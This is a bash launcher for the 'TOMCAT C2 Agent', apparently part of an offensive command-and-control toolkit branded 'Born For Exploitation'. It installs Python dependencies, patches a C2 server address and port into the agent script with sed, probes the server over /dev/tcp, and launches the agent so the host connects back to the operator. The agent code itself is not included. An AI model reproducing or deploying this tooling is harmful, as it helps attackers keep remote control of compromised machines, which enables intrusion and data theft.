#!/bin/bash

# TOMCAT C2 Agent Connector for Linux/macOS
# Author: TOM7

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Configuration
SERVER_HOST="127.0.0.1"  # Change this to your C2 server IP
SERVER_PORT="4444"       # Change this if using different port
AGENT_SCRIPT="tomcatv1a.py"

# Banner
echo -e "${RED}"
cat << "EOF"
    ___________________      _____  _________     ________________ _________  ________
    \__    ___/\_____  \    /     \ \_   ___ \   /  _  \__    ___/ \_   ___ \ \_____  \
      |    |    /   |   \  /  \ /  \/    \  \/  /  /_\  \|    |    /    \  \/  /  ____/
      |    |   /    |    \/    Y    \     \____/    |    \    |    \     \____/       \
      |____|   \_______  /\____|__  /\______  /\____|__  /____|     \______  /\_______ \
                       \/         \/        \/         \/                  \/         \/
EOF
echo -e "${CYAN}            TOMCAT C2 Agent Connector (Linux/macOS)${NC}"
echo -e "${YELLOW}            Author: TOM7 | Born For Exploitation${NC}\n"

# Check if running as root
if [ "$EUID" -eq 0 ]; then
    echo -e "${YELLOW}[!] Running as ROOT${NC}"
else
    echo -e "${BLUE}[*] Running as standard user${NC}"
fi

# Check if Python is installed
echo -e "${BLUE}[*] Checking Python installation...${NC}"
if command -v python3 &> /dev/null; then
    PYTHON_CMD="python3"
    echo -e "${GREEN}[+] Python3 found: $(python3 --version)${NC}"
elif command -v python &> /dev/null; then
    PYTHON_CMD="python"
    echo -e "${GREEN}[+] Python found: $(python --version)${NC}"
else
    echo -e "${RED}[-] Python not found! Please install Python first.${NC}"
    exit 1
fi

# Check if agent script exists
if [ ! -f "$AGENT_SCRIPT" ]; then
    echo -e "${RED}[-] Agent script not found: $AGENT_SCRIPT${NC}"
    echo -e "${YELLOW}[!] Please make sure $AGENT_SCRIPT is in the same directory${NC}"
    exit 1
fi

# Check required Python modules
echo -e "${BLUE}[*] Checking required Python modules...${NC}"
REQUIRED_MODULES=("PIL" "cryptography" "base64" "socket")
MISSING_MODULES=()

for module in "${REQUIRED_MODULES[@]}"; do
    if ! $PYTHON_CMD -c "import $module" 2>/dev/null; then
        MISSING_MODULES+=("$module")
    fi
done

if [ ${#MISSING_MODULES[@]} -gt 0 ]; then
    echo -e "${YELLOW}[!] Missing modules: ${MISSING_MODULES[*]}${NC}"
    echo -e "${BLUE}[*] Installing required modules...${NC}"

    # Install pip if not available
    if ! command -v pip3 &> /dev/null && ! command -v pip &> /dev/null; then
        echo -e "${YELLOW}[*] Installing pip...${NC}"
        if command -v apt-get &> /dev/null; then
            sudo apt-get update
            sudo apt-get install -y python3-pip
        elif command -v yum &> /dev/null; then
            sudo yum install -y python3-pip
        elif command -v brew &> /dev/null; then
            brew install python3
        fi
    fi

    # Install required packages
    if command -v pip3 &> /dev/null; then
        PIP_CMD="pip3"
    else
        PIP_CMD="pip"
    fi

    $PIP_CMD install --upgrade pip
    $PIP_CMD install pillow cryptography

    echo -e "${GREEN}[+] Modules installed${NC}"
else
    echo -e "${GREEN}[+] All required modules are installed${NC}"
fi

# Update agent script with server details
echo -e "${BLUE}[*] Configuring agent...${NC}"
sed -i.bak "s/serverHost = \".*\"/serverHost = \"$SERVER_HOST\"/" "$AGENT_SCRIPT"
sed -i.bak "s/serverPort = [0-9]*/serverPort = $SERVER_PORT/" "$AGENT_SCRIPT"
echo -e "${GREEN}[+] Agent configured for $SERVER_HOST:$SERVER_PORT${NC}"

# Check server connectivity
echo -e "${BLUE}[*] Testing connection to $SERVER_HOST:$SERVER_PORT...${NC}"
if timeout 3 bash -c "cat < /dev/null > /dev/tcp/$SERVER_HOST/$SERVER_PORT" 2>/dev/null; then
    echo -e "${GREEN}[+] Server is reachable!${NC}"
else
    echo -e "${YELLOW}[!] WARNING: Cannot reach server at $SERVER_HOST:$SERVER_PORT${NC}"
    echo -e "${YELLOW}[!] Make sure the C2 server is running${NC}"
    read -p "Continue anyway? (y/n): " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        echo -e "${RED}[-] Aborted${NC}"
        exit 1
    fi
fi

# Launch agent
echo -e "${CYAN}\n[*] Launching TOMCAT Agent...${NC}"
echo -e "${CYAN}[*] Connecting to $SERVER_HOST:$SERVER_PORT${NC}"
echo -e "${YELLOW}[!] Press Ctrl+C to stop${NC}\n"

sleep 1

# Run agent
$PYTHON_CMD "$AGENT_SCRIPT"

# Cleanup on exit
echo -e "\n${YELLOW}[!] Agent stopped${NC}"
echo -e "${BLUE}[*] Cleaning up...${NC}"

# Restore original script
if [ -f "${AGENT_SCRIPT}.bak" ]; then
    mv "${AGENT_SCRIPT}.bak" "$AGENT_SCRIPT"
    echo -e "${GREEN}[+] Agent Script Restored${NC}"
fi

echo -e "${CYAN}[*] Done!${NC}"
